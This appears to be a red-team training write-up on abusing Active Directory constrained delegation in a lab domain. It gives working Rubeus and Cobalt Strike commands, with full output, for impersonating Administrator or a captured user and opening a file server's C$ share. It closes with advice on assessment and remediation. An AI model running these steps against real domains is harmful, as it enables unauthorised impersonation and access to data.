---
title: "Exploiting Constrained Delegation: S4U2Self and S4U2Proxy"
date: 2026-09-25
weight: 3
type: docs
tags:
  - Kerberos
  - Constrained Delegation
  - Active Directory
---

## Constrained Delegation

Microsoft shipped the Service for User (S4U) extension to Kerberos with Windows Server 2003, largely to rein in the sprawling trust model of unconstrained delegation. The extension is really two cooperating protocols:

- **Service for User to Proxy (S4U2proxy).** Lets one service take a user's identity and request a service ticket aimed at a *second, separate* service, such as a web front end reaching through to a database back end. This is the piece most people mean when they say *constrained delegation*.

- **Service for User to Self (S4U2self).** Lets a service mint a service ticket for a user that targets the service *itself*. It exists for situations where the user reached the service over something other than Kerberos. The service uses S4U2self to manufacture a Kerberos ticket for that user, then feeds it into S4U2proxy to reach a downstream service. Chaining the two together is what the documentation calls *protocol transition*.

The key contrast with unconstrained delegation is that S4U caps the blast radius. A delegating service is no longer free to request tickets for anything in the domain; it can only reach the specific SPNs it has been configured to reach. Just as importantly, the service no longer needs to be holding a copy of the user's TGT for any of this to work.

Where unconstrained delegation relied on the `TRUSTED_FOR_DELEGATION` flag, constrained delegation is driven by the `msDS-AllowedToDelegateTo` attribute on the computer object. That attribute is simply the whitelist of SPNs the machine may delegate onward to, for instance `{ MSSQLSvc/cont-sql-1, ... }`.

Finding the machines that carry this configuration is a straightforward directory query. Here it is with `ldapsearch`:

```powershell
beacon> ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo

sAMAccountName: LON-WS-1$
msDS-AllowedToDelegateTo: cifs/lon-fs-1.arcadia.local, cifs/lon-fs-1
```

## Kerberos-only authentication

In the default posture, where the front end accepts only Kerberos, the sequence is unremarkable: the client fires a TGS-REQ for the front-end service, receives a TGS-REP, and then hands the resulting ticket over inside an AP-REQ to authenticate. The front end keeps a copy of that service ticket cached in memory so it has something to work with later.

The interesting part happens when the front end needs to act on the user's behalf against a back-end service. It issues its own TGS-REQ to the KDC for the target SPN and bundles in the user's cached service ticket as evidence.

At that point the KDC checks the requesting computer's `msDS-AllowedToDelegateTo` list for the SPN being asked for. A match means the KDC hands back the requested service ticket, which the front end then uses to authenticate to the back end while presenting the user's identity.

That exchange is S4U2proxy.

## Protocol transition

Protocol transition stays off until someone explicitly sets the `TRUSTED_TO_AUTH_FOR_DELEGATION` flag in the computer object's `userAccountControl`. To tell whether it is on, pull the current value and line it up against Microsoft's [property-flag reference](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties). A computer's baseline value is 4096 (`WORKSTATION_TRUST_ACCOUNT`); anything else tells you extra flags are in play.

```powershell
beacon> ldapsearch (&(samAccountType=805306369)(samaccountname=lon-ws-1$)) --attributes userAccountControl

userAccountControl: 16781312
```

To isolate a single flag, AND the retrieved value against the flag's own value. `TRUSTED_TO_AUTH_FOR_DELEGATION` is 16777216 in decimal, so `[System.Convert]::ToBoolean(16781312 -band 16777216)` in PowerShell resolves to `True` when the flag is present, and `False` when it is not.

Environments like this usually see the user arrive at the front end over a non-Kerberos protocol, with NTLM being the common one. That leaves the front end without a cached Kerberos ticket for the user, unlike the Kerberos-only path above.

To fill the gap, the front end sends a TGS-REQ carrying the user's name while setting the SPN to its own sAMAccountName (for example, *pchilds@lon-ws-1$*), and the KDC returns a service ticket in the TGS-REP.

This is S4U2self, and the ticket it produces is exactly what an S4U2proxy request consumes downstream.

## Attacking S4U

Compromise a machine set up for constrained delegation and you inherit the ability to request tickets for whatever sits in its `msDS-AllowedToDelegateTo` list. How far that gets you hinges on the protocol-transition setting, and the enabled case is by far the friendlier one for an attacker.

### With protocol transition enabled

With protocol transition switched on, an attacker who holds the computer account's TGT can drive an S4U2self request and, crucially, dictate whatever username they like in the TGS-REQ. That means any principal in the domain is fair game to impersonate. The ticket that comes back is forwardable, which is exactly the property S4U2proxy needs to hand back a working service ticket to the target service under the impersonated identity.

Rubeus rolls the S4U2self and S4U2proxy legs into a single `s4u` command:

```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:cifs/lon-fs-1 /ticket:doIFn[...snip...]5DT00= /impersonateuser:Administrator /nowrap
```

Where:

- `/user` is the principal (typically a computer) that carries the delegation.
- `/msdsspn` is the service that principal is cleared to delegate to.
- `/ticket` is the principal's TGT.
- `/impersonateuser` is the identity to assume.

First, Rubeus spends the principal's TGT on an S4U2self request:

```powershell
[*] Action: S4U

[*] Building S4U2self request for: 'LON-WS-1$@ARCADIA.LOCAL'
[*] Using domain controller: lon-dc-1.arcadia.local (10.10.120.1)
[*] Sending S4U2self request to 10.10.120.1:88
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'LON-WS-1$@ARCADIA.LOCAL'
[*] base64(ticket.kirbi):

      doIF8[...snip...]MtMSQ=
```

Feed that ticket to Rubeus `describe` and you'll see the tell-tale signs: the service name is the computer's own sAMAccountName, the user name is the account being impersonated, and the forwardable flag is lit.

```powershell
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /ticket:doIF8[...snip...]MtMSQ=
```

Rubeus then carries that ticket into an S4U2proxy request for whatever SPN you named in `/msdsspn`, and the reply is a service ticket you can actually use as the impersonated user:

```powershell
[*] Impersonating user 'Administrator' to target SPN 'cifs/lon-fs-1'
[*] Building S4U2proxy request for service: 'cifs/lon-fs-1'
[*] Using domain controller: lon-dc-1.arcadia.local (10.10.120.1)
[*] Sending S4U2proxy request to domain controller 10.10.120.1:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/lon-fs-1':

      doIGf[...snip...]ZzLTE=
```

A CIFS ticket in hand means you can browse the target's C$ share:

```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:ARCADIA.LOCAL /username:Administrator /password:FakePass /ticket:doIGf[...snip...]ZzLTE=
  
[*] Using ARCADIA.LOCAL\Administrator:FakePass

[*] Showing process : False
[*] Username        : Administrator
[*] Domain          : ARCADIA.LOCAL
[*] Password        : FakePass
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 3380
[+] Ticket successfully imported!
[+] LUID            : 0x9b6c93
 
beacon> steal_token 3380
beacon> ls \\lon-fs-1\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     01/23/2025 15:44:52   $Recycle.Bin
          dir     01/23/2025 13:57:51   $WinREAgent
          dir     01/23/2025 13:47:37   Documents and Settings
          dir     02/20/2025 10:37:21   Files
          dir     05/08/2021 08:20:24   PerfLogs
          dir     01/23/2025 15:46:17   Program Files
          dir     01/23/2025 15:46:18   Program Files (x86)
          dir     01/24/2025 14:21:18   ProgramData
          dir     01/23/2025 13:47:43   Recovery
          dir     01/24/2025 14:18:02   System Volume Information
          dir     01/24/2025 14:17:49   Users
          dir     01/24/2025 13:34:02   Windows
 12kb     fil     02/20/2025 08:50:25   DumpStack.log.tmp
 1gb      fil     02/20/2025 08:50:25   pagefile.sys
```

### Without protocol transition

Turn protocol transition off and the computer's TGT can no longer coax a *forwardable* ticket out of S4U2self. S4U2self still answers with a ticket, but the forwardable flag is missing, and S4U2proxy rejects it the moment you try to use it:

```powershell
[*] Building S4U2self request for: 'LON-WS-1$@ARCADIA.LOCAL'
[*] Using domain controller: lon-dc-1.arcadia.local (10.10.120.1)
[*] Sending S4U2self request to 10.10.120.1:88
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'LON-WS-1$@ARCADIA.LOCAL'
[*] base64(ticket.kirbi):

      doIF8[...snip...]MtMSQ=
```

```powershell
[*] Impersonating user 'Administrator' to target SPN 'cifs/lon-fs-1'
[*] Building S4U2proxy request for service: 'cifs/lon-fs-1'
[*] Using domain controller: lon-dc-1.arcadia.local (10.10.120.1)
[*] Sending S4U2proxy request to domain controller 10.10.120.1:88

[X] KRB-ERROR (13) : KDC_ERR_BADOPTION
```

For a while there was a way around this, a bug christened the [Bronze Bit](https://www.netspi.com/blog/technical-blog/network-pentesting/cve-2020-17049-kerberos-bronze-bit-overview/) that let an attacker toggle the forwardable bit and quietly promote a non-forwardable ticket to a forwardable one. Microsoft has since closed that hole.

With that route gone, the attacker has to work with a front-end service ticket the target user has *already* obtained. That is a real constraint: instead of picking any account to impersonate, you're stuck with whichever users' front-end tickets you can lay hands on. Those tickets go straight into S4U2proxy and come back out as usable tickets to the target service under those same users.

Suppose we've captured an HTTP service ticket belonging to *dyork@HTTP/lon-ws-1*:

```powershell
[*] Action: Describe Ticket

  ServiceName              :  HTTP/lon-ws-1
  ServiceRealm             :  ARCADIA.LOCAL
  UserName                 :  dyork (NT_PRINCIPAL)
  UserRealm                :  ARCADIA.LOCAL
  StartTime                :  20/02/2025 18:58:24
  EndTime                  :  21/02/2025 04:57:43
  RenewTill                :  27/02/2025 18:57:43
  Flags                    :  name_canonicalize, pre_authent, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  ld5jNd1Dul9W0Dw6kVAQQBSnK72PdOhk9h3z97R0CJQ=
```

The command is the same shape as before, except you swap `/impersonateuser` for `/tgs` and pass the captured ticket:

```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:cifs/lon-fs-1 /ticket:doIFn[...snip...]5DT00= /tgs:doIFp[...snip...]dzLTE= /nowrap
```

Where:

- `/user` is the principal (typically a computer) that carries the delegation.
- `/msdsspn` is the service that principal is cleared to delegate to.
- `/ticket` is the principal's TGT.
- `/tgs` is the captured front-end service ticket for a user.

```powershell
[*] Action: S4U

[*] Loaded a TGS for ARCADIA.LOCAL\dyork
[*] Impersonating user 'dyork' to target SPN 'cifs/lon-fs-1'
[*] Building S4U2proxy request for service: 'cifs/lon-fs-1'
[*] Using domain controller: lon-dc-1.arcadia.local (10.10.120.1)
[*] Sending S4U2proxy request to domain controller 10.10.120.1:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/lon-fs-1':

      doIGL[...snip...]mcy0x
```

That ticket opens the CIFS service on *lon-fs-1* under *dyork*'s identity:

```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:ARCADIA.LOCAL /username:dyork /password:FakePass /ticket:doIGL[...snip...]mcy0x

[*] Using ARCADIA.LOCAL\dyork:FakePass

[*] Showing process : False
[*] Username        : dyork
[*] Domain          : ARCADIA.LOCAL
[*] Password        : FakePass
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 2080
[+] Ticket successfully imported!
[+] LUID            : 0xa1c99b

beacon> steal_token 2080
beacon> ls \\lon-fs-1\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     01/23/2025 15:44:52   $Recycle.Bin
          dir     01/23/2025 13:57:51   $WinREAgent
          dir     01/23/2025 13:47:37   Documents and Settings
          dir     02/20/2025 10:37:21   Files
          dir     05/08/2021 08:20:24   PerfLogs
          dir     01/23/2025 15:46:17   Program Files
          dir     01/23/2025 15:46:18   Program Files (x86)
          dir     01/24/2025 14:21:18   ProgramData
          dir     01/23/2025 13:47:43   Recovery
          dir     01/24/2025 14:18:02   System Volume Information
          dir     01/24/2025 14:17:49   Users
          dir     01/24/2025 13:34:02   Windows
 12kb     fil     02/20/2025 10:50:16   DumpStack.log.tmp
 1gb      fil     02/20/2025 10:50:16   pagefile.sys
```

## Assessing exposure

Judging real risk means walking the whole chain, not fixating on one link. An attacker controls a delegating account; that account's policy permits the target SPN; the KDC honours the S4U request within the ticket and account constraints that apply; and finally the back-end service authorizes the operation being asked for. Those are four separate gates. A service ticket on its own is not the same thing as administrator access.

Lean on the concrete evidence to describe impact honestly: the delegation configuration, account ACLs, who owns the SPN, the authentication policy, and how the back end makes authorization decisions. Steer clear of using Rubeus or any client to pull a ticket for a privileged impersonated identity against a live production service. If a lab owner genuinely needs a working proof, carve out a throwaway identity and a low-value back end under separately written scope.

## Recording and remediation

Capture the same set of details for every finding: the delegating principal, the precise SPNs it may reach, whether protocol transition is set, the service owner, the accounts allowed to edit the object, and the back-end permissions involved. Retire stale SPNs or turn off protocol transition through your normal directory change process, then re-run the inventory and confirm the sanctioned application path still works.

## Further reading

- [Microsoft Open Specifications: S4U overview](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/36d103d2-61a6-42d5-a725-74de3205cdaf)
- [Microsoft Open Specifications: S4U2proxy](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9f44-e1453be7af5a)
- [Microsoft Learn: UserAccountControl flags](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties)
- [GhostPack Rubeus documentation](https://github.com/GhostPack/Rubeus)